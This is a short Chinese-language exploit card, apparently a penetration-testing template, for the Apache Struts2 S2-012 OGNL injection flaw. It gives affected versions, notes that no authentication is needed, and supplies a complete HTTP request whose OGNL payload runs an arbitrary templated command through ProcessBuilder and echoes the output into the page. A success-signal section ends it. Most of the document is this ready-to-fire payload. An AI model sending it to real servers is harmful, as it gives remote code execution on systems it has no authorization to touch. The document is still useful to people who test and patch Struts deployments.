# S2-012 OGNL 注入 RCE

## 指纹特征
- 服务: Apache Struts2 (2.1.0 - 2.3.13)
- 场景: Redirect 结果类型配置包含 OGNL 表达式

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| Redirect 结果注入 | `/*.action` | 无 |

## PoC 指令

通过在 redirect 变量中注入 OGNL 表达式：

```http
GET /user.action?name=%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"{{COMMAND}}"}).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close())} HTTP/1.1
Host: {{TARGET}}:8080
```

## Success Signal
- **状态验证**: 后端成功解析并执行 OGNL 中的命令。
- **验证回显**: 页面直接输出命令结果。
